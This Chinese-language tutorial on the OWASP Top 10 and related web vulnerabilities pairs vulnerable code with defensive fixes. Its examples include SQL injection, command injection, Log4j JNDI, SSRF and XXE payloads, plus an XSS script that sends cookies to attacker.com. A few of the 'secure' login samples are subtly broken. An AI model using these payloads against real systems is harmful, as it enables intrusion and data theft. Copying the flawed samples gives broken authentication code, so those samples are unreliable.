# 常见安全漏洞 (Common Vulnerabilities)

## 版权声明

本作品采用 [知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议](https://creativecommons.org/licenses/by-nc-sa/4.0/) 进行许可。

> **Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0)**
>
> You are free to:
> - **Share** — copy and redistribute the material in any medium or format
> - **Adapt** — remix, transform, and build upon the material
>
> Under the following terms:
> - **Attribution** — You must give appropriate credit
> - **NonCommercial** — You may not use the material for commercial purposes
> - **ShareAlike** — If you remix, transform, or build upon the material, you must distribute your contributions under the same license as the original

---

## 概述

### OWASP Top 10 介绍

**OWASP (Open Web Application Security Project)** 是一个专注于改善软件安全的非营利组织。OWASP Top 10 是Web应用安全领域最具影响力的标准文档，每3-4年更新一次，列出了当前最严重的10种Web安全风险。

```
┌─────────────────────────────────────────────────────────────────┐
│                    OWASP Top 10 演进                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   2013 ─────────────────────────────────────────── 2021         │
│                                                                 │
│   A1 - Injection                      A01 - Broken Access       │
│   A2 - Broken Auth                    A02 - Crypto Failures     │
│   A3 - XSS                            A03 - Injection           │
│   A4 - Insecure Direct Refs           A04 - Insecure Design     │
│   A5 - Security Misconfig             A05 - Security Misconfig  │
│   A6 - Sensitive Data Exposure        A06 - Vulnerable          │
│   A7 - Missing Access Control               Components          │
│   A8 - CSRF                           A07 - Auth Failures       │
│   A9 - Using Known Vuln               A08 - Integrity           │
│   A10 - Unvalidated Redirects               Failures            │
│                                         A09 - Logging Failures  │
│                                         A10 - SSRF              │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 漏洞分类方法

安全漏洞可以从多个维度进行分类：

| 分类维度 | 类型 | 说明 |
|---------|------|------|
| **攻击位置** | 客户端漏洞 | XSS、CSRF、点击劫持 |
| | 服务器端漏洞 | SQL注入、命令注入、路径遍历 |
| **漏洞根源** | 输入验证缺失 | 注入类漏洞 |
| | 认证/授权缺陷 | 越权访问、会话劫持 |
| | 配置错误 | 默认配置、错误处理 |
| | 设计缺陷 | 业务逻辑漏洞 |
| **影响范围** | 信息泄露 | 敏感数据暴露 |
| | 代码执行 | RCE、SQL注入 |
| | 权限提升 | 垂直/水平越权 |

### 安全开发生命周期 (SDL)

```
┌─────────────────────────────────────────────────────────────────┐
│                 安全开发生命周期 (SDL)                           │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   ┌─────────┐   ┌─────────┐   ┌─────────┐   ┌─────────┐        │
│   │ 培训    │ → │ 需求    │ → │ 设计    │ → │ 实现    │        │
│   │ 教育    │   │ 安全分析│   │ 威胁建模│   │ 安全编码│        │
│   └─────────┘   └─────────┘   └─────────┘   └─────────┘        │
│       ↑                                          ↓             │
│       └──────────────────────────────────────────┘             │
│                                                  ↓             │
│   ┌─────────┐   ┌─────────┐   ┌─────────┐   ┌─────────┐        │
│   │ 响应    │ ← │ 发布    │ ← │ 测试    │ ← │ 验证    │        │
│   │ 应急    │   │ 准备    │   │ 安全测试│   │ 静态分析│        │
│   └─────────┘   └─────────┘   └─────────┘   └─────────┘        │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## OWASP Top 10 (2021)

### A01: 失效的访问控制 (Broken Access Control)

#### 漏洞描述

**失效的访问控制**是指用户能够执行超出其预期权限的操作。从2021年上升到第一位，说明这是当前最严重的Web安全风险。

常见形式：
- **IDOR (Insecure Direct Object Reference)**：通过修改URL参数访问未授权资源
- **水平越权**：访问同级别其他用户的数据
- **垂直越权**：普通用户获得管理员权限
- **未授权访问**：无需登录即可访问受保护资源

#### 攻击示例

**漏洞代码 (IDOR)**:
```python
# 漏洞：仅依赖用户提供的ID查询，未验证所有权
@app.route('/api/orders/<order_id>')
def get_order(order_id):
    order = db.query(f"SELECT * FROM orders WHERE id = {order_id}")
    return jsonify(order)
```

攻击者将 `/api/orders/1234` 改为 `/api/orders/1235` 即可查看他人订单。

**漏洞代码 (越权)**:
```javascript
// 前端隐藏管理按钮，但后端未验证
app.post('/admin/delete-user', (req, res) => {
    const userId = req.body.userId;
    // 直接执行删除，未验证当前用户是否为管理员
    User.delete(userId);
    res.json({ success: true });
});
```

#### 防御措施

**安全代码 (IDOR防护)**:
```python
@app.route('/api/orders/<order_id>')
@login_required
def get_order(order_id):
    # 验证当前用户是否有权访问该订单
    order = Order.query.filter_by(
        id=order_id, 
        user_id=current_user.id
    ).first()
    
    if not order:
        abort(403, "无权限访问此订单")
    
    return jsonify(order.to_dict())
```

**安全代码 (权限验证)**:
```javascript
app.post('/admin/delete-user', authenticate, authorize(['admin']), (req, res) => {
    // 必须验证用户身份和权限
    const userId = req.body.userId;
    User.delete(userId);
    res.json({ success: true });
});
```

**防御清单**:
- [ ] 默认拒绝所有访问
- [ ] 服务端验证用户权限，不依赖前端隐藏
- [ ] 使用间接引用映射 (UUID替代自增ID)
- [ ] 实施最小权限原则
- [ ] 记录访问控制失败事件

#### 检测方法

1. **手动测试**：修改URL参数、Cookie、Token尝试越权
2. **自动化扫描**：Burp Suite的Autorize插件
3. **代码审计**：检查每个端点的权限验证逻辑

---

### A02: 加密机制失效 (Cryptographic Failures)

#### 漏洞描述

**加密机制失效**（原"敏感数据泄露"）关注因加密错误或不使用加密而导致的数据保护失败。

常见问题：
- 传输明文数据 (HTTP)
- 使用过时的加密算法 (MD5, SHA1, DES)
- 硬编码密钥
- 不安全的密钥管理
- 不安全的随机数生成

#### 攻击示例

**漏洞代码 (弱哈希)**:
```python
import hashlib

def hash_password(password):
    # 危险：MD5已被破解，无盐容易被彩虹表攻击
    return hashlib.md5(password.encode()).hexdigest()

# 存储：password_hash = hash_password(user_input)
```

**漏洞代码 (明文传输)**:
```python
# 使用HTTP而非HTTPS传输敏感信息
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']  # 明文传输！
    # ...
```

#### 防御措施

**安全代码 (密码哈希)**:
```python
import bcrypt

def hash_password(password: str) -> str:
    """使用bcrypt进行安全的密码哈希"""
    salt = bcrypt.gensalt(rounds=12)
    return bcrypt.hashpw(password.encode(), salt).decode()

def verify_password(password: str, hashed: str) -> bool:
    """验证密码"""
    return bcrypt.checkpw(password.encode(), hashed.encode())
```

**安全配置 (HTTPS强制)**:
```nginx
# Nginx配置：强制HTTPS
server {
    listen 80;
    server_name example.com;
    return 301 https://$server_name$request_uri;
}

server {
    listen 443 ssl http2;
    ssl_certificate /path/to/cert.pem;
    ssl_certificate_key /path/to/key.pem;
    
    # 仅使用安全的TLS版本
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256';
}
```

**加密最佳实践**:
| 用途 | 推荐算法 | 避免使用 |
|------|---------|---------|
| 密码哈希 | bcrypt, Argon2, scrypt | MD5, SHA1, SHA256 |
| 对称加密 | AES-256-GCM | DES, 3DES, ECB模式 |
| 非对称加密 | RSA-2048+, ECDSA P-256 | RSA-1024 |
| 数据传输 | TLS 1.2+ | SSL, TLS 1.0/1.1 |

---

### A03: 注入攻击 (Injection)

#### 漏洞描述

**注入攻击**发生在不可信数据作为命令或查询的一部分被发送到解释器时。攻击者的恶意数据会诱使解释器执行非预期的命令。

常见类型：
- SQL注入
- NoSQL注入
- 命令注入 (OS Command Injection)
- LDAP注入
- XPath注入

#### SQL注入攻击示例

**漏洞代码**:
```python
@app.route('/search')
def search():
    username = request.args.get('username')
    # 危险：直接拼接SQL
    query = f"SELECT * FROM users WHERE username = '{username}'"
    result = db.execute(query)
    return jsonify(result)
```

攻击者输入：`' OR '1'='1' -- `

生成的SQL：
```sql
SELECT * FROM users WHERE username = '' OR '1'='1' -- '
```

**利用UNION提取数据**:
```
攻击载荷：' UNION SELECT username, password FROM users --

结果SQL：
SELECT * FROM products WHERE name = '' 
UNION SELECT username, password FROM users -- '
```

#### 防御措施

**安全代码 (参数化查询)**:
```python
# Python + SQLAlchemy (推荐)
@app.route('/search')
def search():
    username = request.args.get('username')
    result = User.query.filter_by(username=username).all()
    return jsonify([u.to_dict() for u in result])

# 或使用原始参数化查询
@app.route('/search')
def search():
    username = request.args.get('username')
    query = "SELECT * FROM users WHERE username = %s"
    result = db.execute(query, (username,))  # 参数单独传递
    return jsonify(result)
```

**安全代码 (ORM使用)**:
```javascript
// Node.js + Sequelize
app.get('/search', async (req, res) => {
    const users = await User.findAll({
        where: { username: req.query.username }
    });
    res.json(users);
});
```

#### 命令注入攻击示例

**漏洞代码**:
```python
import os

@app.route('/ping')
def ping():
    host = request.args.get('host')
    # 危险：直接拼接命令
    result = os.popen(f"ping -c 1 {host}").read()
    return result
```

攻击者输入：`8.8.8.8; cat /etc/passwd`

#### 命令注入防御

**安全代码**:
```python
import subprocess

@app.route('/ping')
def ping():
    host = request.args.get('host')
    
    # 验证输入格式
    if not re.match(r'^[\w\.-]+$', host):
        return "无效的hostname", 400
    
    # 使用参数列表，而非字符串拼接
    result = subprocess.run(
        ['ping', '-c', '1', host],
        capture_output=True,
        text=True,
        timeout=5
    )
    return result.stdout
```

---

### A04: 不安全的设计 (Insecure Design)

#### 漏洞描述

**不安全的设计**是新增加的类别，关注由于设计缺陷导致的安全问题。与"实现错误"不同，这是架构层面的问题。

常见问题：
- 缺乏安全需求分析
- 威胁建模缺失
- 业务逻辑漏洞
- 无法处理异常流

#### 攻击示例

**业务逻辑漏洞 - 优惠券滥用**:
```python
# 漏洞：允许负数量的商品
def apply_coupon(cart, coupon_code):
    coupon = Coupon.query.filter_by(code=coupon_code).first()
    if coupon:
        cart.total -= coupon.discount  # 未检查最小值
    return cart

# 攻击：多次应用优惠券使总价为负
# 或添加负数量商品
```

**竞态条件**:
```python
# 漏洞：检查余额和扣款不是原子操作
def transfer(from_account, to_account, amount):
    if from_account.balance >= amount:  # 检查
        time.sleep(0.1)  # 模拟处理
        from_account.balance -= amount   # 扣款
        to_account.balance += amount
        db.commit()
```

#### 防御措施

**安全设计原则**:

```
┌─────────────────────────────────────────────────────────────────┐
│                  安全设计原则                                    │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   1. 纵深防御 (Defense in Depth)                                │
│      └── 多层安全控制，不依赖单一防线                           │
│                                                                 │
│   2. 最小权限 (Least Privilege)                                 │
│      └── 仅授予完成任务所需的最小权限                           │
│                                                                 │
│   3. 默认安全 (Secure by Default)                               │
│      └── 默认配置即安全，需显式开放权限                         │
│                                                                 │
│   4. 失败安全 (Fail Securely)                                   │
│      └── 异常时进入安全状态而非开放状态                         │
│                                                                 │
│   5. 完全仲裁 (Complete Mediation)                              │
│      └── 每次访问都进行权限检查                                 │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**威胁建模 (STRIDE)**:

| 威胁 | 描述 | 示例 |
|------|------|------|
| S - Spoofing | 伪装 | 身份伪造 |
| T - Tampering | 篡改 | 修改数据 |
| R - Repudiation | 抵赖 | 否认操作 |
| I - Information Disclosure | 信息泄露 | 敏感数据暴露 |
| D - Denial of Service | 拒绝服务 | 资源耗尽 |
| E - Elevation of Privilege | 权限提升 | 越权操作 |

---

### A05: 安全配置错误 (Security Misconfiguration)

#### 漏洞描述

**安全配置错误**是最常见的漏洞，包括：
- 默认配置未修改
- 不必要的服务开启
- 过时的软件版本
- 错误处理信息泄露
- 云存储权限配置错误

#### 攻击示例

**默认凭据**:
```
/admin /administrator /phpmyadmin
默认账号：admin/admin, root/root, tomcat/tomcat
```

**目录遍历**:
```
http://example.com/backup/
http://example.com/.git/
http://example.com/.env
http://example.com/config.php.bak
```

**错误信息泄露**:
```python
# 漏洞：详细的错误信息暴露内部结构
@app.errorhandler(Exception)
def handle_error(e):
    return jsonify({
        "error": str(e),
        "traceback": traceback.format_exc(),  # 泄露！
        "sql": current_query  # 泄露！
    }), 500
```

#### 防御措施

**安全配置清单**:

```yaml
# 安全配置清单
hardening_checklist:
  server:
    - 移除默认页面和账户
    - 禁用不必要的服务和端口
    - 及时应用安全补丁
    - 配置安全响应头
    
  application:
    - 自定义错误页面
    - 禁用调试模式
    - 移除测试代码
    - 日志记录安全事件
    
  cloud:
    - S3 bucket设为私有
    - 配置安全组规则
    - 启用访问日志
    - 使用IAM角色而非密钥
```

**安全响应头配置**:
```nginx
# Nginx安全响应头
add_header X-Content-Type-Options nosniff;
add_header X-Frame-Options DENY;
add_header X-XSS-Protection "1; mode=block";
add_header Content-Security-Policy "default-src 'self'";
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
add_header Referrer-Policy strict-origin-when-cross-origin;
```

---

### A06: 易受攻击和过时的组件 (Vulnerable Components)

#### 漏洞描述

使用具有已知漏洞的组件（如框架、库、模块），或未及时更新的软件组件。

常见风险：
- 已知CVE漏洞
- 废弃的依赖
- 供应链攻击
- 许可证风险

#### 攻击示例

**Log4j漏洞 (CVE-2021-44228)**:
```java
// 漏洞的Log4j版本 (< 2.15.0)
// 攻击者输入：${jndi:ldap://attacker.com/exploit}
logger.info("User agent: " + userAgent);
// 导致远程代码执行
```

**依赖混淆攻击**:
```
攻击者上传同名的私有包到公共仓库
当依赖解析出错时，可能拉取恶意包
```

#### 防御措施

**依赖管理**:
```bash
# 使用工具扫描依赖漏洞
npm audit                  # Node.js
pip-audit                  # Python
snyk test                  # 跨平台
OWASP Dependency-Check     # Java
```

**安全策略**:
- [ ] 维护软件物料清单 (SBOM)
- [ ] 订阅安全通告
- [ ] 建立补丁管理流程
- [ ] 使用私有仓库管理内部包
- [ ] 定期运行漏洞扫描

---

### A07: 身份认证失败 (Authentication Failures)

#### 漏洞描述

与身份认证相关的漏洞，允许攻击者冒充其他用户。

常见问题：
- 弱密码策略
- 会话管理缺陷
- 凭证填充攻击
- 多因素认证绕过
- 密码恢复漏洞

#### 攻击示例

**暴力破解**:
```python
# 漏洞：无登录限制
@app.route('/login', methods=['POST'])
def login():
    user = User.query.filter_by(
        username=request.form['username']
    ).first()
    
    if user and user.password == hash(request.form['password']):
        session['user_id'] = user.id
        return redirect('/dashboard')
    return '登录失败'
# 攻击者可以无限次尝试密码
```

**会话固定**:
```python
# 漏洞：登录后不重新生成Session ID
@app.route('/login', methods=['POST'])
def login():
    if authenticate(request.form):
        # 危险：保持攻击者提供的session
        session['authenticated'] = True
        return redirect('/dashboard')
```

#### 防御措施

**安全认证实现**:
```python
from flask_limiter import Limiter
from flask_talisman import Talisman

# 1. 实施登录限制
limiter = Limiter(app, key_func=lambda: request.form.get('username'))

@app.route('/login', methods=['POST'])
@limiter.limit("5 per minute")  # 每用户每分钟5次
def login():
    username = request.form['username']
    password = request.form['password']
    
    user = User.query.filter_by(username=username).first()
    
    # 2. 恒定时间比较防止时序攻击
    if user and hmac.compare_digest(
        user.password_hash, 
        hash_password(password)
    ):
        # 3. 登录后重新生成Session ID
        session.regenerate()
        session['user_id'] = user.id
        return redirect('/dashboard')
    
    # 4. 模糊的错误信息
    return '用户名或密码错误'
```

**多因素认证 (MFA)**:
```python
# TOTP实现示例
def verify_totp(user, token):
    """验证基于时间的一次性密码"""
    totp = pyotp.TOTP(user.totp_secret)
    return totp.verify(token, valid_window=1)
```

---

### A08: 软件和数据完整性失败 (Software Integrity Failures)

#### 漏洞描述

在软件更新、关键数据和CI/CD流程中，对完整性的假设没有得到验证。

常见问题：
- 未签名的更新
- 不安全的反序列化
- 依赖混淆
- CI/CD管道漏洞

#### 攻击示例

**不安全的反序列化**:
```python
import pickle

# 漏洞：反序列化不可信数据
@app.route('/load', methods=['POST'])
def load_data():
    data = request.get_data()
    obj = pickle.loads(data)  # 危险！可执行任意代码
    return str(obj)
```

恶意载荷可执行任意系统命令。

**依赖篡改**:
```json
// package.json
{
  "dependencies": {
    "lodash": "^4.17.0"  // 可能安装被篡改的版本
  }
}
```

#### 防御措施

**安全反序列化**:
```python
import json
from marshmallow import Schema, fields, validate

# 使用安全的JSON代替pickle
class UserSchema(Schema):
    username = fields.String(required=True, validate=validate.Length(min=3))
    email = fields.Email(required=True)

@app.route('/load', methods=['POST'])
def load_data():
    schema = UserSchema()
    try:
        result = schema.loads(request.get_data())
        return jsonify(result)
    except ValidationError as err:
        return jsonify(err.messages), 400
```

**完整性验证**:
```bash
# 使用签名验证依赖
npm audit signatures

# 验证文件完整性
sha256sum -c checksum.txt

# 代码签名
gpg --verify update.tar.gz.sig update.tar.gz
```

---

### A09: 安全日志和监控失败 (Logging Failures)

#### 漏洞描述

当日志和监控不足时，攻击者可以在不被发现的情况下攻击系统。

常见问题：
- 关键安全事件未记录
- 日志格式不统一
- 日志存储不安全
- 缺乏实时监控
- 日志注入

#### 攻击示例

**日志注入**:
```python
# 漏洞：未过滤用户输入直接写入日志
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    logger.info(f"登录尝试: {username}")
    # 攻击者输入：admin\n[ERROR] 系统崩溃
    # 导致日志被污染
```

**缺失的安全日志**:
```python
# 漏洞：未记录安全相关事件
@app.route('/transfer', methods=['POST'])
def transfer():
    # 转账逻辑...但未记录
    return "转账成功"
```

#### 防御措施

**安全日志实践**:
```python
import structlog
import hashlib

logger = structlog.get_logger()

def log_security_event(event_type, user, details):
    """记录安全事件"""
    logger.info(
        "security_event",
        event_type=event_type,
        user_id=hashlib.sha256(user.id.encode()).hexdigest()[:16],
        ip_address=request.remote_addr,
        user_agent=request.user_agent.string,
        timestamp=datetime.utcnow().isoformat(),
        details=details
    )

@app.route('/login', methods=['POST'])
def login():
    username = sanitize_input(request.form['username'])
    
    if authenticate(username, request.form['password']):
        log_security_event("login_success", current_user, {"method": "password"})
        return redirect('/dashboard')
    else:
        log_security_event("login_failure", username, {"reason": "invalid_credentials"})
        return '登录失败'
```

**日志监控规则**:
```yaml
# SIEM监控规则
alert_rules:
  - name: "多次登录失败"
    condition: "login_failure_count > 5 in 5 minutes"
    severity: "high"
    
  - name: "异常时间访问"
    condition: "access_time NOT IN business_hours"
    severity: "medium"
    
  - name: "特权操作"
    condition: "event_type IN ['admin_login', 'data_export']"
    severity: "info"
```

---

### A10: 服务端请求伪造 (SSRF)

#### 漏洞描述

**SSRF (Server-Side Request Forgery)** 允许攻击者诱导服务器向攻击者选择的任意域发起请求。

常见利用：
- 访问内网服务
- 读取本地文件
- 攻击云平台元数据服务
- 端口扫描

#### 攻击示例

**漏洞代码**:
```python
@app.route('/fetch')
def fetch_url():
    url = request.args.get('url')
    # 危险：服务器可被诱导访问任意URL
    response = requests.get(url)
    return response.text
```

**攻击载荷**:
```
# 访问AWS元数据服务
http://example.com/fetch?url=http://169.254.169.254/latest/meta-data/

# 访问内网服务
http://example.com/fetch?url=http://localhost:8080/admin

# 读取本地文件 (支持file协议时)
http://example.com/fetch?url=file:///etc/passwd

# 使用DNS重绑定绕过简单检查
http://example.com/fetch?url=http://attacker-controlled-domain.com
```

#### 防御措施

**安全代码**:
```python
import ipaddress
import urllib.parse

def is_safe_url(url):
    """检查URL是否安全"""
    try:
        parsed = urllib.parse.urlparse(url)
        
        # 只允许HTTP和HTTPS
        if parsed.scheme not in ('http', 'https'):
            return False
        
        # 解析主机名
        hostname = parsed.hostname
        if not hostname:
            return False
        
        # 检查是否为内网IP
        try:
            ip = ipaddress.ip_address(hostname)
            # 禁止私有地址
            if ip.is_private or ip.is_loopback or ip.is_reserved:
                return False
        except ValueError:
            # 是域名，检查是否为内部域名
            if hostname in ('localhost', 'metadata.google.internal'):
                return False
            # DNS解析检查
            resolved = socket.getaddrinfo(hostname, None)
            for _, _, _, _, sockaddr in resolved:
                ip = ipaddress.ip_address(sockaddr[0])
                if ip.is_private or ip.is_loopback:
                    return False
        
        return True
    except Exception:
        return False

@app.route('/fetch')
def fetch_url():
    url = request.args.get('url')
    
    if not is_safe_url(url):
        return "无效的URL", 400
    
    # 使用白名单限制可访问的域名
    allowed_domains = ['api.trusted-service.com', 'cdn.example.com']
    parsed = urllib.parse.urlparse(url)
    if parsed.hostname not in allowed_domains:
        return "域名不在白名单中", 403
    
    response = requests.get(url, timeout=5)
    return response.text
```

**SSRF防护架构**:
```
┌─────────────────────────────────────────────────────────────────┐
│                      SSRF防护架构                               │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌─────────────┐    ┌─────────────┐    ┌─────────────┐         │
│  │  输入验证   │ → │  DNS解析    │ → │  连接检查   │         │
│  │             │    │  双重检查   │    │  IP白名单   │         │
│  └─────────────┘    └─────────────┘    └─────────────┘         │
│         ↓                  ↓                  ↓                │
│  ┌─────────────┐    ┌─────────────┐    ┌─────────────┐         │
│  │ URL协议白   │    │ 禁用内网    │    │ 网络隔离    │         │
│  │ 名单(http)  │    │ 地址解析    │    │ (DMZ)       │         │
│  └─────────────┘    └─────────────┘    └─────────────┘         │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 其他重要漏洞

### 跨站脚本攻击 (XSS)

XSS允许攻击者在其他用户的浏览器中执行恶意脚本。

#### XSS类型

| 类型 | 名称 | 特点 | 存储位置 |
|------|------|------|----------|
| 反射型 | Reflected XSS | 恶意脚本在URL中，需诱导点击 | 不存储 |
| 存储型 | Stored XSS | 恶意脚本存储在服务器 | 数据库 |
| DOM型 | DOM-based XSS | 通过JavaScript DOM操作触发 | 客户端 |

#### 攻击示例

**反射型XSS**:
```html
<!-- 漏洞页面：直接输出用户输入 -->
<h1>搜索结果: <?php echo $_GET['q']; ?></h1>

<!-- 攻击URL -->
http://example.com/search?q=<script>alert(document.cookie)</script>
```

**存储型XSS**:
```javascript
// 漏洞：评论系统未过滤
app.post('/comment', (req, res) => {
    const comment = req.body.comment;
    db.save({ text: comment });  // 直接保存
});

// 显示时
app.get('/comments', (req, res) => {
    const comments = db.getAll();
    res.render('comments', { comments }); // 直接渲染
});
```

攻击者提交：`<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>`

**DOM型XSS**:
```javascript
// 漏洞：使用不安全的DOM API
const hash = location.hash;
const content = hash.substring(1);
document.write(content);  // 危险！

// 或使用innerHTML
const search = new URLSearchParams(location.search);
element.innerHTML = search.get('data');  // 危险！
```

#### 防御措施

**安全代码**:
```javascript
// 输出编码 (DOMPurify)
import DOMPurify from 'dompurify';

// 清理HTML
const clean = DOMPurify.sanitize(dirtyHtml);

// 纯文本输出
element.textContent = userInput;  // 安全：自动转义

// 属性设置
element.setAttribute('data-value', userInput); // 相对安全
```

**Content Security Policy (CSP)**:
```http
Content-Security-Policy: 
    default-src 'self';
    script-src 'self' https://trusted-cdn.com;
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: https:;
    connect-src 'self';
    font-src 'self';
    object-src 'none';
    frame-ancestors 'none';
    base-uri 'self';
    form-action 'self';
```

---

### 跨站请求伪造 (CSRF)

CSRF诱导已认证用户在不知情的情况下执行非预期操作。

#### 攻击流程

```
┌──────────────┐           ┌──────────────┐           ┌──────────────┐
│   攻击者     │           │    用户      │           │   银行网站   │
└──────────────┘           └──────────────┘           └──────────────┘
       │                         │                         │
       │ 1. 创建恶意页面         │                         │
       │    <form action=        │                         │
       │     "bank.com/transfer">│                         │
       │------------------------>│                         │
       │                         │ 2. 用户已登录银行         │
       │                         │    (持有有效Cookie)       │
       │                         │<------------------------│
       │                         │                         │
       │ 3. 诱导访问恶意页面     │                         │
       │<------------------------│                         │
       │                         │ 4. 自动提交表单           │
       │                         │------------------------>│
       │                         │    携带银行Cookie         │
       │                         │                         │
       │                         │ 5. 银行执行转账           │
       │                         │<------------------------│
       │                         │                         │
```

#### 防御措施

**CSRF Token**:
```python
# 生成Token
import secrets

def generate_csrf_token():
    return secrets.token_urlsafe(32)

# 嵌入表单
@app.route('/transfer', methods=['GET'])
def transfer_form():
    token = generate_csrf_token()
    session['csrf_token'] = token
    return render_template('transfer.html', csrf_token=token)

# 验证Token
@app.route('/transfer', methods=['POST'])
def transfer():
    if request.form.get('csrf_token') != session.get('csrf_token'):
        abort(403, "CSRF token无效")
    # 执行转账...
```

**SameSite Cookie**:
```python
# Flask设置SameSite
app.config.update(
    SESSION_COOKIE_SAMESITE='Lax',  # 或 'Strict'
    SESSION_COOKIE_SECURE=True,      # 仅HTTPS
    SESSION_COOKIE_HTTPONLY=True     # 禁止JS访问
)
```

---

### 点击劫持 (Clickjacking)

通过透明的iframe覆盖在合法页面上，诱导用户点击。

#### 防御措施

```http
# 禁止页面在iframe中显示
X-Frame-Options: DENY
X-Frame-Options: SAMEORIGIN

# 或使用CSP
Content-Security-Policy: frame-ancestors 'none';
Content-Security-Policy: frame-ancestors 'self' https://trusted.com;
```

---

### 文件上传漏洞

#### 攻击方式
- 上传可执行脚本 (PHP, JSP)
- 上传恶意图片 (图片马)
- 路径遍历 (../../../etc/passwd)

#### 防御措施

```python
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif', 'pdf'}
MAX_FILE_SIZE = 5 * 1024 * 1024  # 5MB

def is_safe_file(file):
    # 1. 验证扩展名
    ext = file.filename.rsplit('.', 1)[1].lower()
    if ext not in ALLOWED_EXTENSIONS:
        return False
    
    # 2. 验证MIME类型
    if file.content_type not in ['image/png', 'image/jpeg', 'image/gif']:
        return False
    
    # 3. 验证文件内容 (魔法数字)
    header = file.read(4)
    file.seek(0)
    if not is_valid_image_header(header):
        return False
    
    # 4. 重命名文件 (不使用原文件名)
    safe_name = f"{uuid.uuid4()}.{ext}"
    
    # 5. 存储在非Web目录
    file.save(f"/secure/uploads/{safe_name}")
    
    return True
```

---

### XML外部实体 (XXE)

#### 漏洞代码
```python
import xml.etree.ElementTree as ET

# 危险：解析XML时允许外部实体
def parse_xml(data):
    tree = ET.parse(data)  # 默认允许外部实体
    return tree.getroot()
```

#### 攻击载荷
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

#### 防御措施

```python
from defusedxml import ElementTree as ET

# 使用安全的解析器
def parse_xml_safe(data):
    return ET.parse(data)  # 默认禁用外部实体

# 或使用lxml并禁用
def parse_xml_safe2(data):
    parser = etree.XMLParser(resolve_entities=False, no_network=True)
    return etree.parse(data, parser)
```

---

## 漏洞扫描与测试

### SAST (静态应用安全测试)

在不运行代码的情况下分析源代码、字节码或二进制代码。

| 工具 | 语言 | 特点 |
|------|------|------|
| SonarQube | 多语言 | 企业级，规则全面 |
| Semgrep | 多语言 | 轻量，自定义规则 |
| Bandit | Python | 专注Python安全 |
| ESLint Security | JavaScript | 集成到开发流程 |
| CodeQL | 多语言 | GitHub集成 |

### DAST (动态应用安全测试)

在运行时测试应用，模拟攻击者行为。

| 工具 | 特点 |
|------|------|
| OWASP ZAP | 开源，功能全面 |
| Burp Suite | 行业标准，专业版强大 |
| Nessus | 网络漏洞扫描 |
| Acunetix | 专注Web |

### IAST (交互式应用安全测试)

结合SAST和DAST，在运行时从应用内部监控。

**优势**:
- 低误报率
- 可检测代码执行路径
- 覆盖复杂的业务逻辑漏洞

### 渗透测试方法

```
┌─────────────────────────────────────────────────────────────────┐
│                   渗透测试流程                                  │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1. 侦察 (Reconnaissance)                                       │
│     └── 信息收集：域名、IP、技术栈、员工信息                     │
│                                                                 │
│  2. 扫描 (Scanning)                                             │
│     └── 端口扫描、服务识别、漏洞扫描                             │
│                                                                 │
│  3. 获取访问 (Gaining Access)                                   │
│     └── 利用漏洞：SQL注入、XSS、文件上传                        │
│                                                                 │
│  4. 权限提升 (Privilege Escalation)                             │
│     └── 从普通用户到管理员，横向移动                            │
│                                                                 │
│  5. 维持访问 (Maintaining Access)                               │
│     └── 后门、持久化机制                                        │
│                                                                 │
│  6. 清除痕迹 (Covering Tracks)                                  │
│     └── 日志清理（在授权测试中通常不进行）                       │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 安全编码实践

### 输入验证

```python
from marshmallow import Schema, fields, validate

class UserRegistrationSchema(Schema):
    username = fields.String(
        required=True,
        validate=[
            validate.Length(min=3, max=32),
            validate.Regexp(r'^[a-zA-Z0-9_]+$')
        ]
    )
    email = fields.Email(required=True)
    age = fields.Integer(
        validate=validate.Range(min=13, max=120)
    )

# 白名单验证优于黑名单
```

### 输出编码

```python
import html

# HTML上下文
def escape_html(text):
    return html.escape(text)

# JavaScript上下文  
def escape_js(text):
    return json.dumps(text)

# URL上下文
def escape_url(text):
    from urllib.parse import quote
    return quote(text, safe='')
```

### 最小权限原则

```python
# 数据库连接使用只读账号进行查询
READONLY_DB_URI = "mysql://readonly_user:pass@host/db"
ADMIN_DB_URI = "mysql://admin_user:pass@host/db"

# 应用只使用只读连接
def get_user_data(user_id):
    conn = create_connection(READONLY_DB_URI)
    return conn.query("SELECT * FROM users WHERE id = %s", user_id)

# 仅在必要时使用管理员连接
def update_user(user_id, data):
    conn = create_connection(ADMIN_DB_URI)
    # 执行更新...
```

---

## 最佳实践

### 安全开发清单

```markdown
## 部署前安全检查清单

### 认证与授权
- [ ] 所有端点都有适当的认证检查
- [ ] 权限验证在服务端进行
- [ ] 会话管理安全（Secure, HttpOnly, SameSite）
- [ ] 密码使用强哈希算法（bcrypt/Argon2）
- [ ] 实施MFA或至少提供选项

### 输入处理
- [ ] 所有输入都经过验证
- [ ] 使用参数化查询防止SQL注入
- [ ] 文件上传限制类型和大小
- [ ] 输出进行适当编码

### 配置安全
- [ ] 生产环境禁用调试模式
- [ ] 默认凭据已更改
- [ ] 敏感配置不在代码中
- [ ] 安全响应头已配置
- [ ] HTTPS强制启用

### 日志与监控
- [ ] 安全事件被记录
- [ ] 日志不包含敏感信息
- [ ] 日志存储在安全位置
- [ ] 异常监控已配置
- [ ] 备份策略已实施

### 依赖管理
- [ ] 依赖已扫描漏洞
- [ ] 不需要的依赖已移除
